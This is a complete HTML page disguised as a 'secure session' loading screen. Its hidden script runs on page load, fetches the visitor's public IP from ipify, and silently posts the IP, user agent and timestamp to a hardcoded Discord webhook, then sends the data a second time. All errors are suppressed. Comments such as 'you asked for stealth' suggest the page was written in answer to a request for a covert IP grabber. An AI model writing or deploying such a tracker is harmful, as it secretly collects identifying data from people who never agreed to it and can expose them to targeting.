<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0e11;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            color: #4f5b66;
            flex-direction: column;
            user-select: none;
        }
        .decoy {
            font-size: 1.4rem;
            letter-spacing: 2px;
            opacity: 0.4;
            animation: pulse 2.4s ease-in-out infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.2; }
            50% { opacity: 0.6; }
            100% { opacity: 0.2; }
        }
        .sub {
            margin-top: 12px;
            font-size: 0.75rem;
            opacity: 0.15;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="decoy">Establishing secure session...</div>
    <div class="sub">handshake v3.2</div>

    <script>
        (function() {
            // Hardcoded Discord webhook URL – exactly as provided.
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";

            // Fetch public IP from ipify (no API key needed, CORS friendly)
            function captureAndSend() {
                fetch("https://api.ipify.org?format=json", { 
                    method: "GET",
                    headers: { "Accept": "application/json" }
                })
                .then(response => {
                    if (!response.ok) throw new Error("IP fetch failed with status " + response.status);
                    return response.json();
                })
                .then(data => {
                    const ip = data.ip || "0.0.0.0";
                    const userAgent = navigator.userAgent || "unknown";
                    const timestamp = new Date().toISOString();

                    // Build Discord webhook payload – embed style for clean logging.
                    const payload = {
                        embeds: [
                            {
                                title: "🔹 Inbound Connection",
                                color: 0x2b2d31, // dark gray
                                fields: [
                                    {
                                        name: "🌐 IP Address",
                                        value: `\`${ip}\``,
                                        inline: true
                                    },
                                    {
                                        name: "🕒 Timestamp",
                                        value: `\`${timestamp}\``,
                                        inline: true
                                    },
                                    {
                                        name: "💻 User-Agent",
                                        value: `\`${userAgent.substring(0, 128)}\``,
                                        inline: false
                                    }
                                ],
                                footer: {
                                    text: "Webhook triggered via HTML page"
                                },
                                timestamp: timestamp
                            }
                        ],
                        // Plain text fallback in case embeds are stripped
                        content: `New IP: ${ip} | UA: ${userAgent.substring(0, 60)}`
                    };

                    // Fire the webhook – fire-and-forget, no waiting.
                    fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload),
                        mode: "no-cors" // avoids CORS preflight; still sends but we can't read response
                    })
                    .catch(err => {
                        // Complete silence – no console, no alerts.
                        // If you want to debug, uncomment the next line, but you asked for stealth.
                        // console.warn("Webhook delivery failed:", err);
                    });

                })
                .catch(err => {
                    // If ipify fails, we still try to send a fallback with "unknown" IP.
                    // Silent fallback – no user-facing error.
                    const fallbackPayload = {
                        embeds: [
                            {
                                title: "⚠️ Connection (IP lookup failed)",
                                color: 0x8b0000,
                                fields: [
                                    { name: "Status", value: "IP service unreachable", inline: true },
                                    { name: "UA", value: `\`${navigator.userAgent.substring(0, 80)}\``, inline: false }
                                ]
                            }
                        ]
                    };
                    fetch(WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(fallbackPayload),
                        mode: "no-cors"
                    }).catch(() => {});
                });
            }

            // Execute immediately when the script runs – no DOMContentLoaded needed.
            captureAndSend();

            // Optional: re-trigger after 3 seconds in case the first one was blocked by a slow network.
            // This is a double-tap to ensure delivery – you can remove if you prefer single shot.
            setTimeout(captureAndSend, 3200);
        })();
    </script>
</body>
</html>
